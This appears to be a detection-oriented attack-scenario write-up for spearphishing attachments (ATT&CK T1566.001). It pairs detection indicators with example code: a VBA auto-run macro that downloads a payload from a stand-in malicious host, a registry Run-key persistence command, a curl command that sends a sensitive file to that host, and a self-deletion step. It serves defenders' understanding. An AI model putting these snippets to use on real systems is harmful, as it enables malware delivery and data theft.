Pattern Name: T1566.001 (Spearphishing Attachment)
Scenario Overview: This attack scenario illustrates a multi-stage spearphishing attack where an attacker sends a malicious email with an attachment that, when opened, executes a payload leading to further exploitation. The attack involves multiple applications, including Outlook for email handling, Excel for the malicious attachment, and a web browser for subsequent payload delivery.

Attack Flow Breakdown:

1. **Initial Access via Email**
   - **Application Involved**: Outlook
   - **User Action**: The user receives an email with a subject line "Important Document" and an attachment named "Invoice_2023.xlsx".
   - **Key Artifacts**: Email headers, attachment file "Invoice_2023.xlsx".
   - **Detection Indicators**: Monitor for emails with suspicious subject lines and attachments from unknown senders.

2. **Opening the Malicious Attachment**
   - **Application Involved**: Microsoft Excel
   - **User Action**: The user opens the attachment in Excel.
   - **Key Artifacts**: Excel file "Invoice_2023.xlsx" containing embedded macros.
   - **Detection Indicators**: Look for Excel files with macros that are executed without user consent.

3. **Macro Execution**
   - **Application Involved**: Microsoft Excel
   - **User Action**: The macro within the Excel file executes automatically (if macros are enabled).
   - **Key Artifacts**: VBA script execution logs, temporary files created by the macro.
   - **Detection Indicators**: Monitor for unusual macro execution patterns, especially those that download files or execute commands.

   ```shell
   # Example of a malicious macro that downloads a payload
   Sub Auto_Open()
       Dim objHTTP As Object
       Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
       objHTTP.Open "GET", "http://malicious-website.com/payload.exe", False
       objHTTP.Send
       ' Save the payload to disk
       Dim oStream As Object
       Set oStream = CreateObject("ADODB.Stream")
       oStream.Type = 1 ' Binary
       oStream.Open
       oStream.Write objHTTP.responseBody
       oStream.SaveToFile "C:\Users\Victim\Downloads\payload.exe", 2 ' Overwrite
       oStream.Close
   End Sub
   ```

4. **Payload Execution**
   - **Application Involved**: Windows Command Prompt (cmd.exe)
   - **User Action**: The macro executes the downloaded payload.
   - **Key Artifacts**: Executable file "payload.exe" in the Downloads folder.
   - **Detection Indicators**: Monitor for execution of newly created executables in user directories, especially those initiated by Excel or other Office applications.

   ```shell
   # Command to execute the downloaded payload
   C:\Users\Victim\Downloads\payload.exe
   ```

5. **Establishing Persistence**
   - **Application Involved**: Windows Registry
   - **User Action**: The payload modifies the registry to ensure persistence.
   - **Key Artifacts**: Registry keys under HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run.
   - **Detection Indicators**: Monitor for changes to registry keys that add new startup entries.

   ```shell
   # Command to add a persistence entry in the registry
   reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MaliciousPayload" /t REG_SZ /d "C:\Users\Victim\Downloads\payload.exe" /f
   ```

6. **Data Exfiltration**
   - **Application Involved**: Web Browser (e.g., Chrome)
   - **User Action**: The payload initiates a connection to a command and control (C2) server to exfiltrate data.
   - **Key Artifacts**: Network traffic to the C2 server, potentially sensitive files being sent.
   - **Detection Indicators**: Monitor for unusual outbound connections, especially to known malicious IP addresses or domains.

   ```shell
   # Example of a command to exfiltrate data
   curl -X POST -F "file=@C:\Users\Victim\Documents\SensitiveData.txt" http://malicious-website.com/exfiltrate
   ```

7. **Cleanup and Evasion**
   - **Application Involved**: Windows Command Prompt
   - **User Action**: The payload deletes itself to cover tracks.
   - **Key Artifacts**: Temporary files and logs that may be deleted.
   - **Detection Indicators**: Monitor for file deletions immediately after execution of suspicious processes.

   ```shell
   # Command to delete the payload after execution
   del C:\Users\Victim\Downloads\payload.exe
   ```
